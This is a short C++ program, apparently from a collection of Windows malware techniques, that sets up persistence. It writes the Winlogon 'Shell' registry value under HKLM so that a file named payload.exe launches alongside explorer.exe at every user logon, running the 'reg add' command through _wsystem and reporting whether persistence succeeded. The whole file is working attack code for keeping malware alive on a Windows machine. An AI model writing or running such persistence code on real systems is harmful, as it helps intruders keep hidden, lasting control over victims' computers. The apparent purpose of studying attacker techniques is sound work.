// Author: Nemuel Wainaina

#include <iostream>

int main() {
    const wchar_t* payload = L"C:\\Users\\Nemuel\\Desktop\\Windows-Malware-Techniques\\persistence\\winlogon-registry-keys\\payload.exe";
    wchar_t sh[512] = L"explorer.exe,";
    wcscat(sh, payload);

    wchar_t command[512];
    swprintf(command,
            L"cmd.exe /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"%s\" /f",
            sh);
    std::wcout << sh << std::endl;
    std::wcout << command << std::endl;

    if (_wsystem(command) == 0) {
        std::cout << "Persistence established successfully" << std::endl;
    } else {
        std::cerr << "Persistence failed" << std::endl;
    }

    return 0;
}
